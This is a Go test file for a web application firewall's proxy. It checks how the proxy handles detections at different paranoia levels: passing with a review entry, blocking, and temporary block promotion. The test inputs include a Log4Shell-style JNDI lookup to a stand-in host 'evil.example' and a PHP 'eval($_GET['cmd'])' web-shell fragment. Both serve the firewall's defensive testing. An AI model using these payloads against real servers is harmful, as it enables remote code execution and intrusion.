package proxy

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/config"
	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
	"github.com/LaokeQwQ/CheeseWAF/internal/engine/semantic"
	"github.com/LaokeQwQ/CheeseWAF/internal/storage"
)

type memoryReviewQueue struct {
	mu    sync.Mutex
	items []*storage.ReviewItem
}

func (q *memoryReviewQueue) Enqueue(_ context.Context, item *storage.ReviewItem) {
	q.mu.Lock()
	defer q.mu.Unlock()
	q.items = append(q.items, item)
}

func (q *memoryReviewQueue) snapshot() []*storage.ReviewItem {
	q.mu.Lock()
	defer q.mu.Unlock()
	out := make([]*storage.ReviewItem, len(q.items))
	copy(out, q.items)
	return out
}

func TestServerEnqueuesEmbeddedDetectionWithoutBlocking(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()

	cfg := config.Default()
	cfg.Sites[0].Upstreams = []config.UpstreamConfig{{Address: upstream.URL, Weight: 1}}
	cfg.Sites[0].WAF.ParanoiaLevel = 3
	cfg.Protection.IP.Whitelist = nil
	cfg.Protection.IP.Blacklist = nil

	server, err := NewServer(&cfg, engine.NewPipeline(semantic.NewAnalyzer("block", 3)), &captureSink{})
	if err != nil {
		t.Fatal(err)
	}
	queue := &memoryReviewQueue{}
	server.SetReviewQueue(queue)

	prose := "note ${jndi:ldap://evil.example/a} in logs"
	req := httptest.NewRequest(http.MethodPost, "http://localhost/api/articles", strings.NewReader(prose))
	req.Header.Set("Content-Type", "text/plain")
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("expected pass, code=%d body=%q", rec.Code, rec.Body.String())
	}
	items := queue.snapshot()
	if len(items) != 1 {
		t.Fatalf("expected one review item, got %#v", items)
	}
	if items[0].Shape != "embedded" || items[0].Category == "" {
		t.Fatalf("unexpected review item: %+v", items[0])
	}
}

func TestServerDoesNotEnqueueBlockedIsolatedDetection(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()

	cfg := config.Default()
	cfg.Sites[0].Upstreams = []config.UpstreamConfig{{Address: upstream.URL, Weight: 1}}
	cfg.Protection.IP.Whitelist = nil
	cfg.Protection.IP.Blacklist = nil

	server, err := NewServer(&cfg, engine.NewPipeline(semantic.NewAnalyzer("block", 3)), &captureSink{})
	if err != nil {
		t.Fatal(err)
	}
	queue := &memoryReviewQueue{}
	server.SetReviewQueue(queue)

	req := httptest.NewRequest(http.MethodGet, "http://localhost/search?s="+url.QueryEscape("eval($_GET['cmd'])"), nil)
	rec := httptest.NewRecorder()
	server.Handler().ServeHTTP(rec, req)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("expected block, code=%d body=%q", rec.Code, rec.Body.String())
	}
	if items := queue.snapshot(); len(items) != 0 {
		t.Fatalf("blocked request must not enqueue, got %#v", items)
	}
}

func TestServerPromotesLevel4EmbeddedToTemporaryBlock(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	}))
	defer upstream.Close()

	cfg := config.Default()
	cfg.Sites[0].Upstreams = []config.UpstreamConfig{{Address: upstream.URL, Weight: 1}}
	cfg.Sites[0].WAF.ParanoiaLevel = 4
	cfg.Sites[0].WAF.SemanticPolicy.PromoteSeconds = 30
	cfg.Protection.IP.Whitelist = nil
	cfg.Protection.IP.Blacklist = nil

	server, err := NewServer(&cfg, engine.NewPipeline(semantic.NewAnalyzer("block", 4)), &captureSink{})
	if err != nil {
		t.Fatal(err)
	}
	queue := &memoryReviewQueue{}
	server.SetReviewQueue(queue)

	prose := "note ${jndi:ldap://evil.example/a} in logs"
	first := httptest.NewRequest(http.MethodPost, "http://localhost/api/articles", strings.NewReader(prose))
	first.Header.Set("Content-Type", "text/plain")
	firstRec := httptest.NewRecorder()
	server.Handler().ServeHTTP(firstRec, first)
	if firstRec.Code != http.StatusOK {
		t.Fatalf("first embedded hit at level 4 must pass, code=%d", firstRec.Code)
	}
	if items := queue.snapshot(); len(items) != 1 {
		t.Fatalf("expected one review item after first pass, got %#v", items)
	}

	second := httptest.NewRequest(http.MethodPost, "http://localhost/api/articles", strings.NewReader(prose))
	second.Header.Set("Content-Type", "text/plain")
	secondRec := httptest.NewRecorder()
	server.Handler().ServeHTTP(secondRec, second)
	if secondRec.Code != http.StatusForbidden {
		t.Fatalf("promoted window must block later embedded hit, code=%d body=%q", secondRec.Code, secondRec.Body.String())
	}
	if items := queue.snapshot(); len(items) != 1 {
		t.Fatalf("blocked promote must not enqueue again, got %#v", items)
	}
}
